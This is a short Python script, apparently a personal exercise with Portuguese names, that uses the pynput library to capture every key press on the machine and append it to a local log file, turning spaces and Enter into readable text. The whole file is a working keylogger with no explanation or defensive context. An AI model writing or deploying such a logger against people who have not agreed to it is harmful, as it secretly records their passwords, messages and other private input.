from pynput.keyboard import Listener
import re
arquivoLog = "/home/ubiratan/Documentos/Python/kLog.log"

def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)

    with open(arquivoLog, "a") as log:
        log.write(tecla)

with Listener(on_press=capturar) as l:
    l.join()
